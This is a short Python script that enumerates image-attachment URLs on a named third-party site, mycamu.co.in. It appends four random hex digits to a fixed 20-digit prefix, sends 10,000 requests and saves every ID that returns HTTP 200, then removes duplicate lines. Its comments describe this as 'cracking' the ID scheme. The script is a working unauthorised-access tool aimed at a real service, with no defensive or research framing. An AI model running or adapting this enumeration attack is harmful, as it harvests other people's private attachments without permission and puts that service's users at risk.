import random
import requests
file_name = "junk.txt" #change name if needed
murl = "https://www.mycamu.co.in/image_attachment/get/" #main url
def generate_hex_string(l): #static+dynamic=24hexdigits needed to crack 
    hex_chars = '0123456789ABCDEF'
    
    
    data="61b30bb75db81f3105c0" #static hexvalue
    for i in range(l):
        data+=random.choice(hex_chars)
    return data
    
def remove_duplicates(input_file, output_file):
    lines_seen = set()  # To keep track of unique lines

    with open(input_file, 'r') as input_f, open(output_file, 'a') as output_f:
        for line in input_f:
            line = line.strip()  # Remove leading/trailing whitespaces
            if line not in lines_seen:
                output_f.write(line + '\n')
                lines_seen.add(line)



len = 4 #dynamic hexvalue length
with open(file_name, "a") as f: 
    for hex_num in range(10000):
        d = generate_hex_string(len)
        curl=murl+d #custom url
        response = requests.get(curl)
        if(response.status_code == 200):
             f.write(d + "\n")
             print("(SUCCESS : 200ok)=> "+curl)
        
        else: #if error needed implement 
            print("NOT FOUND")
            
            
            
# Remove Duplicate lines:
input_file = file_name  # Replace with your input file name
output_file = "new.txt"  # Replace with the desired output file name

remove_duplicates(input_file, output_file)
print("Duplicate lines removed and saved to "+output_file)
